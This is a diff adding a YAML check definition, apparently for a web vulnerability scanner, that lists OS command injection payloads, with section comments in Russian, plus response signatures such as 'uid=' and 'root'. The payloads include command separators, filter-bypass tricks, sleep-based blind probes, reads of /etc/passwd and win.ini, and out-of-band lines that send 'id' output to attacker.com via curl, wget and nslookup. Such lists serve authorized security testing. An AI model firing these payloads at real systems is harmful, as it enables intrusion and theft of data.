@@ -1,0 +1,87 @@
+name: Remote Code Execution / Command Injection
+type: rce
+description: "RCE and OS command injection payloads — semicolon, &&, pipe, $(), backticks, newline, blind OOB variants"
+detection: "check response for uid=, root, command output"
+signatures:
+  - "uid="
+  - "root"
+  - "bin/bash"
+  - "bin/sh"
+  - "command not found"
+  - "Windows IP Configuration"
+  - "Volume in drive"
+  - "sh: "
+  - "bash: "
+  - "Permission denied"
+payloads:
+  # --- Основные разделители (Linux) ---
+  - ";id"
+  - " ;id"
+  - "| id"
+  - "|| id"
+  - "& id"
+  - "&& id"
+  - "`id`"
+  - "$(id)"
+  - "\nid"
+  - "%0aid"
+  - "%0a id"
+
+  # --- С пробелами ---
+  - "; id"
+  - " && id"
+  - " || id"
+  - "| id #"
+  - "; id #"
+
+  # --- Windows ---
+  - "& whoami"
+  - "| whoami"
+  - "|| whoami"
+  - "&& whoami"
+  - "; whoami"
+  - "`whoami`"
+  - "$(whoami)"
+  - "\r\nwhoami"
+  - "%0d%0awhoami"
+
+  # --- Обход пробелов (Linux) ---
+  - ";{id}"
+  - ";${IFS}id"
+  - ";id%09"
+  - ";<(id)"
+  - ";id<"
+
+  # --- Blind OOB (DNS exfil) ---
+  - ";nslookup$(id).attacker.com"
+  - "| nslookup `id`.attacker.com"
+  - "`curl http://attacker.com/?x=$(id)`"
+  - "$(curl http://attacker.com/?x=$(id))"
+  - ";curl http://attacker.com/$(id)"
+  - ";wget http://attacker.com/?x=`id`"
+
+  # --- time-based blind (если нет вывода) ---
+  - "; sleep 5"
+  - "| sleep 5"
+  - "& sleep 5"
+  - "&& sleep 5"
+  - "|| sleep 5"
+  - "`sleep 5`"
+  - "$(sleep 5)"
+  - "; ping -c 5 127.0.0.1"
+
+  # --- Полезные команды для проверки ---
+  - "; cat /etc/passwd"
+  - "| cat /etc/passwd"
+  - "; whoami; id; hostname"
+  - "; ls -la /"
+  - "; uname -a"
+  - "& type C:\\Windows\\win.ini"
+  - "| type C:\\Windows\\win.ini"
+
+  # --- Обход фильтров ---
+  - ";i`echo d`"
+  - ";\"i\"\"d\""
+  - ";$'id'"
+  - ";p'i'n'g' -c 1 127.0.0.1"
+  - ";w'h'o'a'm'i"
